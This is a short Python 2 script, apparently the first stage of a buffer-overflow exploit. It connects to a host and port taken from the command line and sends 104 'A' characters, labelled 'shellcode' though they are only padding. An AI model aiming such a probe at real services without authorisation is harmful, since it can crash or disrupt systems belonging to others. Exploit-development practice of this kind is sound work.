#!/usr/bin/python

import sys, socket

shellcode = ("A"*104)

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
sock.connect(( sys.argv[1], int(sys.argv[2]) ))
sock.send(shellcode)
sock.close()

print "Shellcode Length: %d" %len(shellcode)
